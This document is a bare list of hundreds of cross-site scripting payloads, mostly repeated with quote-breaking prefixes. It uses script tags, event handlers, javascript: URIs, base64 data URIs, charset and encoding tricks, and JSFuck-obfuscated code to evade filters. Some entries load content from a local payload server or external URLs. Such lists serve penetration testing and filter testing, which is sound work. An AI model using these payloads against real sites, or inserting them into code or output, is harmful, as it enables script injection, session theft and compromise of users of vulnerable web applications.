''">
”><script>alert(“X”)</script>
’><script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>
' '><script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>
<script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>
" onerror=alert(1) "
" onerror=alert(1) x="
-alert(1)-
-prompt(1)-
<marquee/onstart=confirm(1)>
"><marquee/onstart=confirm(1)>
'><marquee/onstart=confirm(1)>
<img src=x onerror=prompt(1);> 
"><img src=x onerror=prompt(1);> 
'><img src=x onerror=prompt(1);> 
<img src=x onerror=prompt(1)>
"><img src=x onerror=prompt(1)>
'><img src=x onerror=prompt(1)>
'';!--"<X>=&{()}
<SCRIPT>+alert("X");</SCRIPT>
"><SCRIPT>+alert("X");</SCRIPT>
'><SCRIPT>+alert("X");</SCRIPT>
<SCRIPT>+alert("X")</SCRIPT>
"><SCRIPT>+alert("X")</SCRIPT>
'><SCRIPT>+alert("X")</SCRIPT>
<script>alert(/X/)</script>
"><script>alert(/X/)</script>
'><script>alert(/X/)</script>
<svg><script>varmyvar="text&quot;;alert(1)//";</script></svg>
"><svg><script>varmyvar="text&quot;;alert(1)//";</script></svg>
'><svg><script>varmyvar="text&quot;;alert(1)//";</script></svg>
<object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
"><object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
'><object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
<math><a xlink:href="//127.0.0.1:3555/xss_serve_payloads/X.js">click
"><math><a xlink:href="//127.0.0.1:3555/xss_serve_payloads/X.js">click
'><math><a xlink:href="//127.0.0.1:3555/xss_serve_payloads/X.js">click
<embed code="http://127.0.0.1:3555/xss_serve_payloads/flash.swf" allowscriptaccess=always>
"><embed code="http://127.0.0.1:3555/xss_serve_payloads/flash.swf" allowscriptaccess=always>
'><embed code="http://127.0.0.1:3555/xss_serve_payloads/flash.swf" allowscriptaccess=always>
<script itworksinallbrowsers>/*<script* */alert(1)</script
"><script itworksinallbrowsers>/*<script* */alert(1)</script
'><script itworksinallbrowsers>/*<script* */alert(1)</script
<img src ?itworksonchrome?\/onerror = alert(1)
"><img src ?itworksonchrome?\/onerror = alert(1)
'><img src ?itworksonchrome?\/onerror = alert(1)
<script crossorigin>alert(1);</script>
"><script crossorigin>alert(1);</script>
'><script crossorigin>alert(1);</script>
<script async>alert(1);</script async>
"><script async>alert(1);</script async>
'><script async>alert(1);</script async>
<script charset>alert(1);</script charset>
"><script charset>alert(1);</script charset>
'><script charset>alert(1);</script charset>
<script a b c >alert(1)</script d e f>
"><script a b c >alert(1)</script d e f>
'><script a b c >alert(1)</script d e f>
<img src=x onerror=document.body.innerHTML=location.hash>#"><img src=x onerror=prompt(1)>
"><img src=x onerror=document.body.innerHTML=location.hash>#"><img src=x onerror=prompt(1)>
'><img src=x onerror=document.body.innerHTML=location.hash>#"><img src=x onerror=prompt(1)>
"><img src=x onerror=prompt(1)>
'><img src=x onerror=prompt(1)>
<img src=x onerror=document.body.innerHTML=location.hash>#"><img/src='x'onerror=prompt(1)>
"><img src=x onerror=document.body.innerHTML=location.hash>#"><img/src='x'onerror=prompt(1)>
'><img src=x onerror=document.body.innerHTML=location.hash>#"><img/src='x'onerror=prompt(1)>
<img src=x onerror=document.body.innerHTML=location.hash>#<img src=x onerror=prompt(1)>
"><img src=x onerror=document.body.innerHTML=location.hash>#<img src=x onerror=prompt(1)>
'><img src=x onerror=document.body.innerHTML=location.hash>#<img src=x onerror=prompt(1)>
"><img src=x onerror=prompt(1)>
'><img src=x onerror=prompt(1)>
<img src=x onerror=document.body.innerHTML=location.hash>#<img/src='x'onerror=prompt(1)>
"><img src=x onerror=document.body.innerHTML=location.hash>#<img/src='x'onerror=prompt(1)>
'><img src=x onerror=document.body.innerHTML=location.hash>#<img/src='x'onerror=prompt(1)>
<svg onload=document.body.innerHTML=location.hash>#<img src=x onerror=alert(1)>
"><svg onload=document.body.innerHTML=location.hash>#<img src=x onerror=alert(1)>
'><svg onload=document.body.innerHTML=location.hash>#<img src=x onerror=alert(1)>
<svg onload=document.body.innerHTML=location.hash>#<img src='x'onerror=alert(1)>
"><svg onload=document.body.innerHTML=location.hash>#<img src='x'onerror=alert(1)>
'><svg onload=document.body.innerHTML=location.hash>#<img src='x'onerror=alert(1)>
<svg onload=document.body.innerHTML=location.hash>#<svg onload=prompt(1)>
"><svg onload=document.body.innerHTML=location.hash>#<svg onload=prompt(1)>
'><svg onload=document.body.innerHTML=location.hash>#<svg onload=prompt(1)>
<svg onload=document.body.innerHTML=location.hash>#<svg/onload=prompt(1)>
"><svg onload=document.body.innerHTML=location.hash>#<svg/onload=prompt(1)>
'><svg onload=document.body.innerHTML=location.hash>#<svg/onload=prompt(1)>
--!><svg onload=prompt(1)
eval(((_=!1)+{})[1]+(_+{})[2]+(_+{})[4]+((_=!!1)+{})[1]+(_+{})[0]+((_=>(_))+1)[3]+1+((_=>(_))+1)[5])
eval((_=!0+(()=>0)+!1)[10]+_[11]+_[3]+_[1]+_[0]+_[4]+1+_[5])
<marquee>alert( `X :)`)</marquee>
"><marquee>alert( `X :)`)</marquee>
'><marquee>alert( `X :)`)</marquee>
<"script">"alert(0)"</"script">
"><"script">"alert(0)"</"script">
'><"script">"alert(0)"</"script">
<s[NULL]cript>alert(1)</s[NULL]cript>'>X</a>
"><s[NULL]cript>alert(1)</s[NULL]cript>'>X</a>
'><s[NULL]cript>alert(1)</s[NULL]cript>'>X</a>
<video><source o?UTF-8?Q?n?error="alert(1)">
"><video><source o?UTF-8?Q?n?error="alert(1)">
'><video><source o?UTF-8?Q?n?error="alert(1)">
<body scroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
"><body scroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
'><body scroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
<meta charset="x-mac-farsi">Â¼script Â¾alert(1)//Â¼/script Â¾
"><meta charset="x-mac-farsi">Â¼script Â¾alert(1)//Â¼/script Â¾
'><meta charset="x-mac-farsi">Â¼script Â¾alert(1)//Â¼/script Â¾
<x onload'=alert(1)
"><x onload'=alert(1)
'><x onload'=alert(1)
<sc'+'ript>alert(1)</script>
"><sc'+'ript>alert(1)</script>
'><sc'+'ript>alert(1)</script>
<FRAMESET><FRAME RC=""+"javascript:alert('X');"></FRAMESET>
"><FRAMESET><FRAME RC=""+"javascript:alert('X');"></FRAMESET>
'><FRAMESET><FRAME RC=""+"javascript:alert('X');"></FRAMESET>
</script>"//'//<svg%0Aonload=alert(1)//>
"></script>"//'//<svg%0Aonload=alert(1)//>
'></script>"//'//<svg%0Aonload=alert(1)//>
'//</script><svg%20"%0aonload=alert(1)%20//>
</script>'//<svg "%0Aonload=alert(1) //>
"></script>'//<svg "%0Aonload=alert(1) //>
'></script>'//<svg "%0Aonload=alert(1) //>
'//</script><svg "%0Aonload=alert(1)// />
</script>"//'//<svg%0Aonload=alert(1) //>
"></script>"//'//<svg%0Aonload=alert(1) //>
'></script>"//'//<svg%0Aonload=alert(1) //>
</script>'//<svg "%0Aonload=alert(1)// />
"></script>'//<svg "%0Aonload=alert(1)// />
'></script>'//<svg "%0Aonload=alert(1)// />
</script "//'//><svg%0Aonload=alert(1)//>
"></script "//'//><svg%0Aonload=alert(1)//>
'></script "//'//><svg%0Aonload=alert(1)//>
';//</script><svg ";%0Aonload=alert(1)// />#
</script><img src '//"%0Aonerror=alert(1)//
"></script><img src '//"%0Aonerror=alert(1)//
'></script><img src '//"%0Aonerror=alert(1)//
</script><svg onload='-/"/-[alert(1)]//'/>
"></script><svg onload='-/"/-[alert(1)]//'/>
'></script><svg onload='-/"/-[alert(1)]//'/>
</script><img '//"%0Aonerror=alert(1)// src>
"></script><img '//"%0Aonerror=alert(1)// src>
'></script><img '//"%0Aonerror=alert(1)// src>
</script><img '//"%0Aonerror=alert(1)// src=1>
"></script><img '//"%0Aonerror=alert(1)// src=1>
'></script><img '//"%0Aonerror=alert(1)// src=1>
</script "/*'/*><svg */; onload=alert(1) //>
"></script "/*'/*><svg */; onload=alert(1) //>
'></script "/*'/*><svg */; onload=alert(1) //>
</script><script>/*"/*'/**/;alert(1)//</script>#
"></script><script>/*"/*'/**/;alert(1)//</script>#
'></script><script>/*"/*'/**/;alert(1)//</script>#
</script "/*'/*><img/src=x */; onerror=alert(1) //
"></script "/*'/*><img/src=x */; onerror=alert(1) //
'></script "/*'/*><img/src=x */; onerror=alert(1) //
</script><script>/*var a="/*""'/**/;alert(1);//</script>
"></script><script>/*var a="/*""'/**/;alert(1);//</script>
'></script><script>/*var a="/*""'/**/;alert(1);//</script>
<iframe src="data:data:javascript:,% 3 c script % 3 e confirm(1) % 3 c/script %3 e">
"><iframe src="data:data:javascript:,% 3 c script % 3 e confirm(1) % 3 c/script %3 e">
'><iframe src="data:data:javascript:,% 3 c script % 3 e confirm(1) % 3 c/script %3 e">
' style='width:expression(prompt(1));
"width:expression(prompt(1))
width:\0065\0078\0070\0072\0065\0073\0073\0069\006F\006E\0028\0070\0072\006F\006D\0070\0074\0028\0031\0029\0029
javascript:prompt(1)
javascript:\u0070rompt&#x28;1&#x29;
jAvAsCrIpT&colon;prompt&lpar;1&rpar;
http://jsfiddle.net/xboz/c7vvkedv/
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
"><EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
'><EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
<DIV STYLE="width:\0065\0078\0070\0072\0065\0073\0073\0069\006F\006E\0028\0070\0072\006F\006D\0070\0074\0028\0031\0029\0029">
"><DIV STYLE="width:\0065\0078\0070\0072\0065\0073\0073\0069\006F\006E\0028\0070\0072\006F\006D\0070\0074\0028\0031\0029\0029">
'><DIV STYLE="width:\0065\0078\0070\0072\0065\0073\0073\0069\006F\006E\0028\0070\0072\006F\006D\0070\0074\0028\0031\0029\0029">
data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5wcm9tcHQoMSk8L3NjcmlwdD4=
data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+cHJvbXB0KDEpOzwvc2NyaXB0Pjwvc3ZnPg==
data:text/html;base64,PHNjcmlwdD5wcm9tcHQoMSk8L3NjcmlwdD4=
data:text/html;,&#60&#115&#99&#114&#105&#112&#116&#62&#112&#114&#111&#109&#112&#116&#40&#49&#41&#60&#47&#115&#99&#114&#105&#112&#116&#62
``onerror=prompt(1)
alert(/XSS/);
1;alert(/XSS/);
1';alert(/XSS/);x='1
';alert(/XSS/);'
<svg><script>prompt&#40 1&#41</script>
"><svg><script>prompt&#40 1&#41</script>
'><svg><script>prompt&#40 1&#41</script>
<html> <script> var a="</script><script>alert(1)//";</script> </html>
"><html> <script> var a="</script><script>alert(1)//";</script> </html>
'><html> <script> var a="</script><script>alert(1)//";</script> </html>
&#34;><script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>
'';}}</script><script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>
<body onpageshow=alert(1)>
"><body onpageshow=alert(1)>
'><body onpageshow=alert(1)>
<body onpageshow=alert(1);>
"><body onpageshow=alert(1);>
'><body onpageshow=alert(1);>
<body/onpageshow=alert(1)>
"><body/onpageshow=alert(1)>
'><body/onpageshow=alert(1)>
<body/onpageshow=alert(1);>
"><body/onpageshow=alert(1);>
'><body/onpageshow=alert(1);>
"><b/onclick="javascript:window.window.window['alert'](1)">bold 
<body language=vbs onload=window.location='data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=='>
"><body language=vbs onload=window.location='data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=='>
'><body language=vbs onload=window.location='data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=='>
behaviour:url\0028javascript:alert\0028[0][0]\0029\0029
<iframe src="javascript:x:alert(1)">
"><iframe src="javascript:x:alert(1)">
'><iframe src="javascript:x:alert(1)">
<a href="javascript:x:alert(1)">x</a>
"><a href="javascript:x:alert(1)">x</a>
'><a href="javascript:x:alert(1)">x</a>
<a href=j&#x00000000041vascr&#x00000000069pt:alert(1)>X</a>
"><a href=j&#x00000000041vascr&#x00000000069pt:alert(1)>X</a>
'><a href=j&#x00000000041vascr&#x00000000069pt:alert(1)>X</a>
<div contextmenu=x>right-click<menu id=x onshow=alert(1)>
"><div contextmenu=x>right-click<menu id=x onshow=alert(1)>
'><div contextmenu=x>right-click<menu id=x onshow=alert(1)>
";document.body.addEventListener("DOMActivate",alert(1))//
/*@cc_on @if(1)alert(1)@end
var a=0; ((a == 1) ? 2 : alert(1));//
(0)['constructor']['constructor']("\141\154\145\162\164(1)")();
<input oninput=alert(1)>
"><input oninput=alert(1)>
'><input oninput=alert(1)>
<video onprogress=alert(1)><source src=//a.a>
"><video onprogress=alert(1)><source src=//a.a>
'><video onprogress=alert(1)><source src=//a.a>
<video onprogress=alert(1)><source src=x>
"><video onprogress=alert(1)><source src=x>
'><video onprogress=alert(1)><source src=x>
<video/onprogress=alert(1)><source/src=//a.a>
"><video/onprogress=alert(1)><source/src=//a.a>
'><video/onprogress=alert(1)><source/src=//a.a>
<video/onprogress=alert(1)><source/src=x>
"><video/onprogress=alert(1)><source/src=x>
'><video/onprogress=alert(1)><source/src=x>
<video onprogress=alert(1)><source src=http://127.0.0.1:3555/xss_serve_payloads/X.ogg>
"><video onprogress=alert(1)><source src=http://127.0.0.1:3555/xss_serve_payloads/X.ogg>
'><video onprogress=alert(1)><source src=http://127.0.0.1:3555/xss_serve_payloads/X.ogg>
<video/onprogress=alert(1)><source/src=http://127.0.0.1:3555/xss_serve_payloads/X.ogg>
"><video/onprogress=alert(1)><source/src=http://127.0.0.1:3555/xss_serve_payloads/X.ogg>
'><video/onprogress=alert(1)><source/src=http://127.0.0.1:3555/xss_serve_payloads/X.ogg>
<svg onload=\u0061lert(1)>
"><svg onload=\u0061lert(1)>
'><svg onload=\u0061lert(1)>
<meta%20charset=HZ-GB-2312><scrip~}t>alert(1)</scrip~}t>
"><meta%20charset=HZ-GB-2312><scrip~}t>alert(1)</scrip~}t>
'><meta%20charset=HZ-GB-2312><scrip~}t>alert(1)</scrip~}t>
<meta charset=HZ-GB-2312><scrip~}t>alert(1)</script>
"><meta charset=HZ-GB-2312><scrip~}t>alert(1)</script>
'><meta charset=HZ-GB-2312><scrip~}t>alert(1)</script>
<meta charset=utf-7><img src=x o%2BAG4-error=alert(1)>
"><meta charset=utf-7><img src=x o%2BAG4-error=alert(1)>
'><meta charset=utf-7><img src=x o%2BAG4-error=alert(1)>
<meta charset=Shift_JIS><script>x="く\";alert(1)//"</script>
"><meta charset=Shift_JIS><script>x="く\";alert(1)//"</script>
'><meta charset=Shift_JIS><script>x="く\";alert(1)//"</script>
this["alert"]("X")
this['alert'](1)
<script>this["alert"]("X")</script>
"><script>this["alert"]("X")</script>
'><script>this["alert"]("X")</script>
<svg/onload=t=/aler/.source+/t/.source;window.onerror=window[t];throw+1;//
"><svg/onload=t=/aler/.source+/t/.source;window.onerror=window[t];throw+1;//
'><svg/onload=t=/aler/.source+/t/.source;window.onerror=window[t];throw+1;//
<svgonload=alert(1)>
"><svgonload=alert(1)>
'><svgonload=alert(1)>
<svg><use xlink:href="data:image/svg+xml;base64,PHN2ZyBpZD0icmVjdGFuZ2xlIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiAgICB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCI+PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg0KIDxmb3JlaWduT2JqZWN0IHdpZHRoPSIxMDAiIGhlaWdodD0iNTAiDQogICAgICAgICAgICAgICAgICAgcmVxdWlyZWRFeHRlbnNpb25zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIj4NCgk8ZW1iZWQgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiIHNyYz0iamF2YXNjcmlwdDphbGVydCgxKSIgLz4NCiAgICA8L2ZvcmVpZ25PYmplY3Q+DQo8L3N2Zz4=#rectangle" />
"><svg><use xlink:href="data:image/svg+xml;base64,PHN2ZyBpZD0icmVjdGFuZ2xlIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiAgICB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCI+PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg0KIDxmb3JlaWduT2JqZWN0IHdpZHRoPSIxMDAiIGhlaWdodD0iNTAiDQogICAgICAgICAgICAgICAgICAgcmVxdWlyZWRFeHRlbnNpb25zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIj4NCgk8ZW1iZWQgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiIHNyYz0iamF2YXNjcmlwdDphbGVydCgxKSIgLz4NCiAgICA8L2ZvcmVpZ25PYmplY3Q+DQo8L3N2Zz4=#rectangle" />
'><svg><use xlink:href="data:image/svg+xml;base64,PHN2ZyBpZD0icmVjdGFuZ2xlIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiAgICB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCI+PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg0KIDxmb3JlaWduT2JqZWN0IHdpZHRoPSIxMDAiIGhlaWdodD0iNTAiDQogICAgICAgICAgICAgICAgICAgcmVxdWlyZWRFeHRlbnNpb25zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIj4NCgk8ZW1iZWQgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiIHNyYz0iamF2YXNjcmlwdDphbGVydCgxKSIgLz4NCiAgICA8L2ZvcmVpZ25PYmplY3Q+DQo8L3N2Zz4=#rectangle" />
"-alert(1)-"
"/alert(1)/"
"|alert(1)|"
==alert(1)==
[alert(1)]+
^alert(1)^
|alert(1)|
&alert(1)&
>>alert(1)>>
<form name=self location="javascript:alert(1)"
"><form name=self location="javascript:alert(1)"
'><form name=self location="javascript:alert(1)">
"><form name=self location="javascript:alert(1)"
"><form name=self location="javascript:alert(1)"
'><form name=self location="javascript:alert(1)">
'><form name=self location="javascript:alert(1)"
"><form name=self location="javascript:alert(1)"
'><form name=self location="javascript:alert(1)">
<form name=self location="javascript:alert(1)"
"><form name=self location="javascript:alert(1)"
'><form name=self location="javascript:alert(1)"
'|\u0061lert()|'
<style%0conload=alert(1)>
"><style%0conload=alert(1)>
'><style%0conload=alert(1)>
<ScR<ScRiPt>IpT>prompt(1)<%2FsCr<ScRiPt>IpT>
"><ScR<ScRiPt>IpT>prompt(1)<%2FsCr<ScRiPt>IpT>
'><ScR<ScRiPt>IpT>prompt(1)<%2FsCr<ScRiPt>IpT>
<scrip<script>t>alert(1)</script>
"><scrip<script>t>alert(1)</script>
'><scrip<script>t>alert(1)</script>
javasCript:eval%28'aler'+'t'+'%28%29'%29
&quot;&gt;&lt;img src=x onerror=confirm(1);&gt;
Data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==
<img%0D%0Asrc%3Da%0D%0Aonerror%3Dalert%281%29>
"><img%0D%0Asrc%3Da%0D%0Aonerror%3Dalert%281%29>
'><img%0D%0Asrc%3Da%0D%0Aonerror%3Dalert%281%29>
<IMG SRC="jav	ascript:alert('X');">
"><IMG SRC="jav	ascript:alert('X');">
'><IMG SRC="jav	ascript:alert('X');">
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("X")>
"><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("X")>
'><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("X")>
\";alert('X');//
&#x00027;; confirm(1); &#x00027; 
&#39;; confirm(1); &#39; 
%27; confirm(1); %27 
&apos;; confirm(1); &apos; 
\u0027 confirm(1); \u0027 
"; [][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])(); "
"; eval('\u0061'+'\x6c'+'e'+'r'+'t')(2); "
"; alert&#40 3&#41 ; "
"; javascript:&#x61;ler\u0074&lpar;4); "
"; javascript:window.open('data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=='); "
"onmouseover="alert(1)
&#34;onmouseover=&#34;alert(1)
&#x00022;onmouseover=&#x00022;alert(1)
%22onmouseover=%22alert(1)
&quot;onmouseover=&quot;alert(1)
\u0022onmouseover=\u0022alert(1)
width:expression(prompt(1))
width:ex/**/pression(prompt(1))
width&#x3A;ex/**/pression&#x28;prompt&#x28;1&#x29;&#x29;
width:expression\28 prompt \28 1 \29 \29
width:\0065\0078\0070\0072\0065\0073\0073\0069\006F\006E\0028\0070\0072\006F\006D\0070\0074\0028\0031\0029\0029"
background-image: url(javascript:prompt(1))
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
"><a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
'><a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
"><img src=x onerror=window.open('http://www.opensecurity.in/');>
<object data=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==></object>
"><object data=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==></object>
'><object data=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==></object>
<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>
"><a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>
'><a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>
<svg+onload=confirm(1);>
"><svg+onload=confirm(1);>
'><svg+onload=confirm(1);>
<svg onload=prompt(1);>
"><svg onload=prompt(1);>
'><svg onload=prompt(1);>
<input+onfocus=alert(1)>
"><input+onfocus=alert(1)>
'><input+onfocus=alert(1)>
∀㸀㰀script㸀alert(1)㰀/script㸀
&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;
<a href="j&#x26;#x26#x41;vascript:alert%252831337%2529">X</a>
"><a href="j&#x26;#x26#x41;vascript:alert%252831337%2529">X</a>
'><a href="j&#x26;#x26#x41;vascript:alert%252831337%2529">X</a>
<scr\x00ipt>confirm(1);</scr\x00ipt>
"><scr\x00ipt>confirm(1);</scr\x00ipt>
'><scr\x00ipt>confirm(1);</scr\x00ipt>
<svg/onload=prompt(1);>
"><svg/onload=prompt(1);>
'><svg/onload=prompt(1);>
<svg><script>alert&#40/1/&#41</script>
"><svg><script>alert&#40/1/&#41</script>
'><svg><script>alert&#40/1/&#41</script>
<isindex action="javas&Tab;cript:alert(1)" type=image>
"><isindex action="javas&Tab;cript:alert(1)" type=image>
'><isindex action="javas&Tab;cript:alert(1)" type=image>
<form action='data:text&sol;html,&lt;script&gt;alert(1)&lt/script&gt'><button>CLICK
"><form action='data:text&sol;html,&lt;script&gt;alert(1)&lt/script&gt'><button>CLICK
'><form action='data:text&sol;html,&lt;script&gt;alert(1)&lt/script&gt'><button>CLICK
<form action='java&Tab;scri&Tab;pt:alert(1)'><button>CLICK
"><form action='java&Tab;scri&Tab;pt:alert(1)'><button>CLICK
'><form action='java&Tab;scri&Tab;pt:alert(1)'><button>CLICK
<form action=javascript&NewLine;:alert(1)><input type=submit>
